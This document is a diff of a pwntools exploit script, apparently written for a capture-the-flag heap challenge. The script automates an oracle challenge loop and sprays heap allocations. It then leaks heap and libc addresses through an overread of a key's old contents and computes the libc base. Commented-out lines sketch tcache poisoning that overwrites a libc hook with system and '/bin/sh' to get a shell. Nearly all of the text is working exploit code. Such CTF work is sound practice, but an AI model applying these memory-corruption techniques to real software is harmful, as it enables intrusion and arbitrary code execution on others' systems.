@@ -28,10 +28,12 @@ def key_show():
     cmd(0)
     cmd(2)
     cmd(4)
-def key_edit(idx):
+def key_edit(idx,c):
     cmd(0)
     cmd(3)
     sla(": ",str(idx).encode())
+    sa(": ",c)
+    cmd(4)
 def encode(key_idx,c=b'A'*0x30,size=0x1000):
     cmd(1)
     sla(": ",str(key_idx).encode())
@@ -90,36 +92,99 @@ def LastByteOrecal(c,p):
             # input()
             if(XxX(c,p[plain],kl)):
                 return plain
-def chal():
+def chal(rd = 0x100,r=b"0.70",new_rd = b"0"):
     cmd(3)
     plaintext = []
     for x in range(4):
         p.readline() 
         plaintext.append(p.readline()[:-1])
         p.readline()
-    for x in range(0x100):
-        print(f"{x}/0x100")
+    for x in range(rd):
+        # print(f"{x}/0x100")
         ru("rtext:\n")
         c = p.readline()[:-1]
         c = base64.b64decode(c)
         res = LastByteOrecal(c,plaintext)
         sla("text:\n",str(res).encode())
-    sla(":\n",b"0.65")
+    sla(": \n",r)
+    sla(": \n",new_rd)
         
 add  = key_add
 free = key_del
 show = key_show
-chal()
-# 
-
-for x in range(0xff):
-    add(x,0x2,b"AA")
+edit = key_edit
 context.log_level='debug'
 
-add(0xff,0x19,b"a"*0x19)
+chal()
+for x in range(0x1f):
+   add(x,0x2,b"AA")
 
-free(0xff)
-gdb.attach(p,'b *0x555555555707')
-encode(0,b"A"*0x22,size=0x22)
+encode(0,b"A"*0x108,0x108)
+
+chal(0x0,b"0.33")
+
+
+# edit a key, whoes length is modified but it's ptr should not be corrupted
+cmd(0)
+
+cmd(2)
+ct = 0 
+klen =""
+while(1):
+    ru("], len = ")
+    klen = p.readline()
+    if(klen!=b'2 \n'):
+        ct+=1
+        continue
+    
+    break
+if(ct==0):
+    p.close()
+    exit(1)
+cmd(4)
+context.log_level='WARNING'
+
+encode(30,b"A"*0xf00,0xf00)
+free(ct) # in tcache
+free(ct+1) # in tcache
+
+
+# context.log_level='debug'
+cmd(0)
+cmd(3)
+sla(": ",str(ct-1).encode())
+ru("Old key:\n")
+val = 0 
+
+heap = 0 
+while(1):
+    val = u64(p.read(8))
+    log.info(hex(val))
+    if( heap==0 ):
+        if((val>>40)==0x55 or (val>>40)==0x56):
+            heap = val
+    if((val>>40)==0x7f):
+        break
+base = val -(0x7ffff7fb1be0-0x7ffff7dc6000)
+log.warning(hex(base))#
+log.warning(hex(heap))#
+
+
+input()
+gdb.attach(p,'b readn')
+# context.log_level='debug'
+
+# pay = b'\0'*0x80+flat([heap+0x40,0,0,0x21,0x1eeb20+base])
+# sa(": ",pay)
+# cmd(4)
+# add(ct,0x10,b"A"*0x10)
+
+# cmd(0)
+# cmd(0)
+# sla(": ",str(ct+1).encode())
+# sla(": ",str(0x10).encode())
+# sa(": ",b"/bin/sh\0"+p64(0x55410+base))
+
+
 
 p.interactive()
